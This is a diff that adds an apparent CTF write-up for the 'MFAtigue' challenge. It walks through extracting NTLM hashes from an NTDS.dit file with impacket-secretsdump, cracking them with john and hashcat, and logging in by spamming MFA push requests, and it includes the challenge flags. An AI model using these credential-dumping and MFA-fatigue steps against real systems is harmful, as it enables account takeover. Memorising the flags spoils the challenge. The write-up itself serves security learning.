@@ -3196,3 +3196,98 @@ I used CyberChef to XOR decript to decrypt `victim-files\flag.txt.encry`.
 > flag{092744b55420033c5eb9d609eac5e823}
 
 Got flag.
+
+## MFAtigue
+
+### Description
+
+> We got our hands on an NTDS file, and we might be able to break into the Azure Admin account! Can you track it down and try to log in? They might have MFA set up though...
+>
+> Download the file(s) below and press the Start button on the top-right to begin this challenge.
+>
+> Attachments: NTDS.zip
+
+### Flag
+
+flag{9b896a677de35d7dfa715a05c25ef89e}
+
+### Solution
+
+```console
+$ unzip NTDS.zip
+Archive:  NTDS.zip
+  inflating: ntds.dit
+  inflating: SYSTEM
+
+$ file ntds.dit SYSTEM
+ntds.dit: Extensible storage engine DataBase, version 0x620, checksum 0x1d1fabe5, page size 8192, Windows version 10.0
+SYSTEM:   MS Windows registry file, NT/2000 or above
+```
+
+Dump NTLM password hash by using [impacket-secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py).
+
+```console
+$ impacket-secretsdump -system SYSTEM -ntds ntds.dit -outputfile hashes local
+Impacket v0.11.0 - Copyright 2023 Fortra
+(snip)
+
+
+
+$ john --format=NT hashes.ntds
+(snip)
+katlyn99         (huntressctf.local\JILLIAN_DOTSON)
+(snip)
+
+$ # or I can use hashcat instead
+
+$ cut -d':' -f4 hashes.ntds > hashes.ntlm.txt
+
+$ hashcat -m 1000 hashes.ntlm.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+(snip)
+
+$ hashcat -m 1000 hashes.ntlm.txt /usr/share/wordlists/rockyou.txt --show
+31d6cfe0d16ae931b73c59d7e0c089c0:
+08e75cc7ee80ff06f77c3e54cadab42a:katlyn99
+
+$ grep 08e75cc7ee80ff06f77c3e54cadab42a hashes.ntds
+huntressctf.local\JILLIAN_DOTSON:1113:aad3b435b51404eeaad3b435b51404ee:08e75cc7ee80ff06f77c3e54cadab42a:::
+```
+
+Got the `huntressctf\JILLIAN_DOTSON:katlyn99` credential.
+
+Accessed this challenge URL and entered `huntressctf.local\JILLIAN_DOTSON` for username, but it showed `Login domain 'huntressctf\' must be specified.` and failed.
+
+![MFAtigue_failuser.png](img/MFAtigue_failuser.png)
+
+Next, entered `huntressctf\JILLIAN_DOTSON` (without `.local`) for username and `katlyn99` for password, then it showed `Approve sign in request`.
+
+![MFAtigue_require_MFA.png](img/MFAtigue_require_MFA.png)
+
+Looked at source code.
+When accessing /mfa, it seems I can get the flag if the user has authenticated.
+
+```html
+<script>
+    $(document).ready(function() {
+        $('#submitBtn').click(function(event) {
+            event.preventDefault();
+
+            $.notify("Push notification sent!", "success");
+
+            setTimeout(function() {
+                $.post("/mfa", function(data) {
+                    if(data === "authenticated") {
+                        window.location.href = "/flag";
+                    }
+                });
+            }, 500);
+        });
+    });
+</script>
+```
+
+This challenge name is MFAtigue and I guessed the name is maked a play on [MFA Fatigue](https://en.wikipedia.org/wiki/Multi-factor_authentication_fatigue_attack).
+Clicked `Send Push Notification` button repeatedly, Got flag.
+
+![MFAtigue_flag.png](img/MFAtigue_flag.png)
